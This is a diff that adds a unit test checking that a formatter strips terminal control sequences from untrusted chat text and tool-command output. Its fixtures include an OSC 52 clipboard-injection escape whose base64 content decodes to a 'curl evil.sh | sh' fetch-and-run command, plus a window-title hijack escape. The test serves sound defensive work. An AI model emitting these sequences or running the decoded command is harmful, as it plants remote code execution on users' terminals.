@@ -111,3 +111,13 @@ test("cuts long lines at 300 characters", () => {
 	assert.equal(oneLine(`${"a".repeat(298)}\n\nb`), `${"a".repeat(298)} b`);
 	assert.equal(oneLine("a".repeat(301)), `${"a".repeat(300)}…`);
 });
+
+test("strips terminal control sequences from untrusted text", () => {
+	const clipboard = "\x1b]52;c;Y3VybCBldmlsLnNoIHwgc2g=\x07";
+	const title = "\x1b]0;pwned\x9c";
+	assert.equal(oneLine(`luiz: hi${clipboard} there${title}`), "luiz: hi]52;c;Y3VybCBldmlsLnNoIHwgc2g= there]0;pwned");
+	assert.deepEqual(
+		formatEvent({ type: "tool_execution_start", args: { command: `louro send '#bots' 'hi${clipboard}'` }, ...call }),
+		["$ louro send '#bots' 'hi]52;c;Y3VybCBldmlsLnNoIHwgc2g='"],
+	);
+});
